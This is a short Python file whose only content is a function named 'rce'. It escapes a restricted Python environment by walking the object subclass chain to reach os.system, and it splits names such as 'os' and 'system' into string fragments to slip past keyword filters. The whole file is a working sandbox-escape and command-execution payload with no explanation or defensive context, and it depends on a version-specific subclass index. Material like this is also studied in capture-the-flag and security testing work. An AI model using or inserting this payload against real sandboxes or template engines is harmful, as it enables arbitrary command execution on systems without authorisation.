# -*- coding：utf-8 -*-
def rce(cmd):
    [].__class__.__mro__[-1].__subclasses__()[71].__init__.__getattribute__('__global' + 's__')['o' + 's'].__dict__['sy' + 'stem'](cmd)